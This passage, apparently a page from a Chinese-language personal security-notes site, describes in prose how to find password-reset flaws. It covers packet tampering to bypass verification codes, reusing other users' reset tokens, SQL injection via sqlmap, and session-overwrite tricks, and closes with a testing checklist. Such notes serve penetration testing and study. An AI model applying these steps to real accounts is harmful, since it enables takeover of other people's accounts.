+<p>利用他人手机找回密码，URL 跳转到验证身份页面，链接中就有一段加密字符串，记录下，随便输入验证码</p>
+<p>抓包，修改包中数据为正常流程下的数据，替换加密字符串，Forward 发送，就可以绕过验证码，直接修改密码</p>
+<p>输入用户名，加个单引号报错，说明可能存在报错，抓包，保存为 txt 文件，导入 Sqlmap 中跑一遍</p>
+<p>找回密码处存在注入漏洞(见框就×)</p>
+<p>通过邮箱找回密码，正常流程下，抓包查看提交验证码后返回的数据，发现有加密字符串，这个加密字符串和后面重新设置新密码 URL 链接中的加密字符串一样，所以可以利用这个加密字符串</p>
+<p>根据上面提交验证码的抓包，修改其中的 User 为其他用户（User 有可能会使用 md5 加密），发送，就可以返回其他用户的加密字符串</p>
+<p>重新返回到找回密码首页，利用其他用户找回，点下一步，到输入验证码处（也有可能需要点击发送验证码），直接修改 URL 链接，加入加密字符串，可以直接绕过验证码，重置密码</p>
+<p>session覆盖漏洞</p>
+<p>注册重复的用户名，例如 admin，相当于修改了密码</p>
+<p>同一浏览器，首先输入自己的账户进行邮箱密码找回，进入邮箱查看链接，接着输入他人账户，进行密码找回，返回刚刚自己的邮箱点击链接，由于 session 覆盖导致了，这个链接成为了修改他人密码的链接，成功修改他人密码</p>
+<p>尝试正常密码找回流程</p>
+<p>选择不同的找回方式，记录所有数据包</p>
+<p>邮箱找回密码</p>
+<p>根据密码保护问题找回密码</p>
+<p>根据手机号找回密码</p>
+<p>分析数据包，找出敏感部分</p>
+<p>分析后台找回机制所采用的验证手段</p>
+<p>修改数据包进行验证是否存在密码找回漏洞</p>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-02-22 23:34:14</span>
+      
+    
+  </small>
+</div>
+
+              
+            </article>
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2017 - 2022
+    </div>
+  
+  <a >keep learning ，stay foolish ，continue thinking</a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    <a href="https://github.com/klsfct" target="_blank" rel="noopener" title="圆周 on github" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.indexes", "navigation.top", "header.autohide"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.22074ed6.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.960e086b.min.js"></script>
+      
+        <script src="../../js/google-tongji.js"></script>
+      
+    
+  </body>
+</html>
